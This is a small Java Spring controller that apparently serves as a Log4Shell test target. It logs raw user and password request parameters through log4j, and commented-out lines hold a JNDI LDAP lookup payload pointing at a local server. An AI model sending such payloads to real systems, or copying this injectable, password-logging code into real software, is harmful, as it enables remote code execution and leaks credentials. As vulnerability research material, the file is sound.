package com.example.demo;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class DirectController {

    private static final Logger  logger = LogManager.getLogger(DirectController.class);
    @PostMapping("/direct")
    public String hello(@RequestParam("user") String user,
                        @RequestParam("password") String password) {
//        password = "${jndi:ldap://127.0.0.1:1389/Exp}";
//        user = "dockyu";

        logger.error("user:{}, password:{}" , user ,password);
//        logger.error("${jndi:ldap://127.0.0.1:1389/Exp}");
//        return "name：" + name + "\nage：" + age;
        return "direct";
    }
}